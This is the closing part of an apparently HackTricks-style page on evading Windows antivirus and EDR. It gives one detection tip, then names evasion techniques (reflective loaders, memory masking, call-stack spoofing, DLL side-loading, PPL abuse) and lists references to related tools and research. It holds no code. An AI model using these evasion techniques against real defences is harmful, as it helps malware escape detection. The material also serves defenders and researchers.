- Image‑load evasion: if hooking LoadLibrary*, monitor suspicious loads of automation/clr assemblies correlated with memory masking events.

Powiązane elementy budulcowe i przykłady
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
